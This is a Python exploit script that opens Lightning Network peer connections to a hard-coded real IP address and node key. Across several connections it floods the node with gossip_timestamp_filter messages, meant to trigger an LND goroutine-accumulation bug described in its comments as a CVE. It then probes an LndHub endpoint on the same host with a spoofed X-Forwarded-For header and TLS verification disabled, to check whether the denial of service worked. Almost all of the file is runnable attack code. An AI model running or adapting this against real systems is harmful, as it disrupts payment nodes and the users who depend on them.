import socket, os, struct, time, hashlib, hmac, sys
from coincurve import PrivateKey, PublicKey
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

TARGET = ("164.90.154.223", 9735)
RS = bytes.fromhex("02ff5f1f0721f5b7ff0d3dc374a2216c2482f78fdabdb7fbbd209da3b7f537dbd5")

sha256 = lambda d: hashlib.sha256(d).digest()
hmac256 = lambda k, d: hmac.new(k, d, hashlib.sha256).digest()
def hkdf(s, i):
    p = hmac256(s, i); return hmac256(p, b'\x01'), hmac256(p, hmac256(p, b'\x01') + b'\x02')
def enc(k, n, a, p):
    return ChaCha20Poly1305(k).encrypt(b'\x00'*4 + struct.pack('<Q', n), p, a)
def dec(k, n, a, c):
    return ChaCha20Poly1305(k).decrypt(b'\x00'*4 + struct.pack('<Q', n), c, a)
def ecdh(p, q):
    return sha256(PublicKey(q).multiply(p).format(compressed=True))

chain = bytes.fromhex("6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000")

def do_handshake():
    h = sha256(b"Noise_XK_secp256k1_ChaChaPoly_SHA256")
    ck = h[:]; h = sha256(h + b"lightning"); h = sha256(h + RS)
    ep = os.urandom(32); epub = PrivateKey(ep).public_key.format(compressed=True)
    h = sha256(h + epub); ss = ecdh(ep, RS); ck, t1 = hkdf(ck, ss)
    c = enc(t1, 0, h, b''); h = sha256(h + c)
    
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(15); sk.connect(TARGET); sk.send(b'\x00' + epub + c)
    
    a2 = b''
    while len(a2) < 50:
        ch = sk.recv(50-len(a2))
        if not ch: return None
        a2 += ch
    if len(a2) != 50: return None
    
    re = a2[1:34]; ac = a2[34:50]
    h = sha256(h + re); ck, t2 = hkdf(ck, ecdh(ep, re)); dec(t2, 0, h, ac); h = sha256(h + ac)
    sp = os.urandom(32); spub = PrivateKey(sp).public_key.format(compressed=True)
    cs = enc(t2, 1, h, spub); h = sha256(h + cs); ck, t3 = hkdf(ck, ecdh(sp, re))
    t = enc(t3, 0, h, b''); h = sha256(h + t); sk.send(b'\x00' + cs + t)
    
    skey, rkey = hkdf(ck, b'')
    return sk, skey, rkey

# Connect multiple times and send burst each time
# CVE: each gossip_timestamp_filter spawns a goroutine
# Goal: accumulate goroutines across multiple connections

CONNECTIONS = 10
BURST_PER_CONN = 500

total_sent = 0
for conn_num in range(CONNECTIONS):
    result = do_handshake()
    if not result:
        print(f"  Conn {conn_num}: handshake failed"); continue
    
    sk, skey, rkey = result
    sn = [0]
    
    def send_ln(msg):
        lc = enc(skey, sn[0], b'', struct.pack('>H', len(msg))); sn[0] += 1
        bc = enc(skey, sn[0], b'', msg); sn[0] += 1
        sk.send(lc + bc)
    
    def recv_ln():
        sk.settimeout(3)
        lc = b''
        while len(lc) < 18: lc += sk.recv(18-len(lc))
        lb = dec(rkey, 0, b'', lc)  # Note: simplified, nonce tracking omitted for speed
        return True
    
    # Read init
    try:
        sk.settimeout(5)
        init_data = sk.recv(4096)
        # Send init back (echo features)
        send_ln(init_data[:-16] if len(init_data) > 16 else struct.pack('>H', 16) + struct.pack('>H', 0) + struct.pack('>H', 3) + b'\x20\x02\xa2')
    except: pass
    
    # BURST: send as many gossip_timestamp_filter as possible
    sent = 0
    for i in range(BURST_PER_CONN):
        try:
            msg = struct.pack('>H', 265) + chain + struct.pack('>I', total_sent + i) + struct.pack('>I', 0xFFFFFFFF)
            send_ln(msg)
            sent += 1
        except:
            break
    
    total_sent += sent
    print(f"  Conn {conn_num}: sent {sent} gossip_timestamp_filter (total: {total_sent})")
    sk.close()
    time.sleep(0.5)

print(f"\nTotal gossip_timestamp_filter sent: {total_sent}")
print("Each creates a goroutine in LND — goroutines accumulate!")

# Verify: is the LndHub still responsive?
import requests, urllib3
urllib3.disable_warnings()
try:
    r = requests.get("https://164.90.154.223/getinfo", 
                     headers={"Authorization": "Bearer test", "X-Forwarded-For": "10.99.99.1"},
                     verify=False, timeout=10)
    print(f"\nLndHub response: {r.status_code}")
    if r.status_code == 200:
        import json
        d = r.json()
        print(f"  Node alias: {d.get('alias','?')}")
        print(f"  Channels: {d.get('num_active_channels','?')}")
        print(f"  Peers: {d.get('num_peers','?')}")
except Exception as e:
    print(f"\nLndHub UNREACHABLE: {e}")
    print("*** POSSIBLE DoS IMPACT! ***")

